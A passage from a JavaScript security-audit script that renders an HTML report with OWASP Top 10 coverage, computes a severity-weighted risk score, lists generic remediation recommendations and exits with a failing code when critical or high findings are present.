        ` : '<div class="section"><h2>✅ No Security Vulnerabilities Found</h2><p>All security tests passed successfully.</p></div>'}
        
        <div class="section">
            <h2>📋 OWASP Top 10 Coverage</h2>
            <div class="owasp-grid">
                ${Object.entries(report.owaspCategories).map(([code, data]) => `
                    <div class="owasp-item">
                        <strong>${code}: ${data.name}</strong><br>
                        <span style="color: ${data.findings > 0 ? '#dc2626' : '#10b981'}">
                            ${data.findings} findings
                        </span>
                    </div>
                `).join('')}
            </div>
        </div>
        
        <div class="section">
            <div class="recommendations">
                <h3>🎯 Security Recommendations</h3>
                <ul>
                    ${report.recommendations.map(rec => `<li>${rec}</li>`).join('')}
                </ul>
            </div>
        </div>
        
        <div style="text-align: center; color: #6b7280; margin-top: 40px;">
            <p>Security Audit completed in ${(report.duration / 1000).toFixed(2)} seconds</p>
        </div>
    </div>
</body>
</html>`;

    await fs.writeFile(outputPath, html);
  }

  getAuditSummary() {
    const severityCounts = {
      critical: this.findings.filter(f => f.severity === 'CRITICAL').length,
      high: this.findings.filter(f => f.severity === 'HIGH').length,
      medium: this.findings.filter(f => f.severity === 'MEDIUM').length,
      low: this.findings.filter(f => f.severity === 'LOW').length
    };

    const riskScore = (severityCounts.critical * 10) + 
                     (severityCounts.high * 5) + 
                     (severityCounts.medium * 2) + 
                     (severityCounts.low * 1);

    return {
      totalFindings: this.findings.length,
      ...severityCounts,
      riskScore,
      securityLevel: this.getSecurityLevel(riskScore),
      testsPassed: this.testResults.filter(t => t.passed).length,
      totalTests: this.testResults.length
    };
  }

  getSecurityLevel(riskScore) {
    if (riskScore === 0) return 'EXCELLENT';
    if (riskScore <= 5) return 'GOOD';
    if (riskScore <= 15) return 'FAIR';
    if (riskScore <= 30) return 'POOR';
    return 'CRITICAL';
  }

  getOWASPCategorySummary() {
    const categories = {};
    
    Object.entries(SECURITY_CONFIG.vulnerabilityCategories).forEach(([code, name]) => {
      categories[code] = {
        name,
        findings: this.findings.filter(f => f.category === code).length
      };
    });
    
    return categories;
  }

  generateRecommendations() {
    const recommendations = [];
    const severities = this.findings.map(f => f.severity);
    
    if (severities.includes('CRITICAL')) {
      recommendations.push('Address all CRITICAL vulnerabilities immediately');
      recommendations.push('Conduct code review of affected components');
      recommendations.push('Consider temporarily disabling affected endpoints');
    }
    
    if (severities.includes('HIGH')) {
      recommendations.push('Prioritize HIGH severity vulnerabilities in next sprint');
      recommendations.push('Implement additional input validation');
      recommendations.push('Review authentication and authorization logic');
    }
    
    if (this.findings.some(f => f.category === 'A05_2021')) {
      recommendations.push('Review and strengthen security headers configuration');
      recommendations.push('Implement proper error handling without information disclosure');
    }
    
    if (this.findings.some(f => f.category === 'A03_2021')) {
      recommendations.push('Use parameterized queries for all database operations');
      recommendations.push('Implement proper input sanitization and validation');
      recommendations.push('Consider using ORM with built-in protection');
    }
    
    recommendations.push('Implement automated security testing in CI/CD pipeline');
    recommendations.push('Regular security audits and penetration testing');
    recommendations.push('Security awareness training for development team');
    recommendations.push('Implement logging and monitoring for security events');
    
    return recommendations;
  }

  printSecuritySummary(summary) {
    console.log('\n' + '='.repeat(80));
    console.log('🛡️  SECURITY AUDIT SUMMARY');
    console.log('='.repeat(80));
    console.log(`Security Level: ${summary.securityLevel}`);
    console.log(`Risk Score: ${summary.riskScore}`);
    console.log(`Total Findings: ${summary.totalFindings}`);
    console.log(`  🔴 Critical: ${summary.critical}`);
    console.log(`  🟠 High: ${summary.high}`);
    console.log(`  🟡 Medium: ${summary.medium}`);
    console.log(`  🟢 Low: ${summary.low}`);
    console.log(`Tests Passed: ${summary.testsPassed}/${summary.totalTests}`);
    
    if (summary.totalFindings > 0) {
      console.log('\n🚨 IMMEDIATE ACTION REQUIRED:');
      if (summary.critical > 0) console.log(`   • Fix ${summary.critical} CRITICAL vulnerabilities`);
      if (summary.high > 0) console.log(`   • Address ${summary.high} HIGH priority issues`);
    } else {
      console.log('\n✅ No security vulnerabilities detected!');
    }
    
    console.log('='.repeat(80));
  }

  async generateErrorReport(error) {
    const errorReport = {
      timestamp: new Date().toISOString(),
      error: error.message,
      stack: error.stack,
      findings: this.findings,
      testResults: this.testResults
    };

    const errorPath = path.join(__dirname, '..', 'test-reports', 
      `security-audit-error-${Date.now()}.json`);
    
    await fs.mkdir(path.dirname(errorPath), { recursive: true });
    await fs.writeFile(errorPath, JSON.stringify(errorReport, null, 2));
    
    console.log(`📁 Error report saved: ${errorPath}`);
  }
}

// CLI execution
if (require.main === module) {
  const auditor = new SecurityAuditor();
  
  auditor.runSecurityAudit()
    .then(summary => {
      console.log('\n✅ Security audit completed');
      // Exit with non-zero code if critical/high vulnerabilities found
      const exitCode = (summary.critical > 0 || summary.high > 0) ? 1 : 0;
      process.exit(exitCode);
    })
    .catch(error => {
      console.error('\n❌ Security audit failed:', error.message);
      process.exit(1);
    });
}

module.exports = { SecurityAuditor, SECURITY_CONFIG };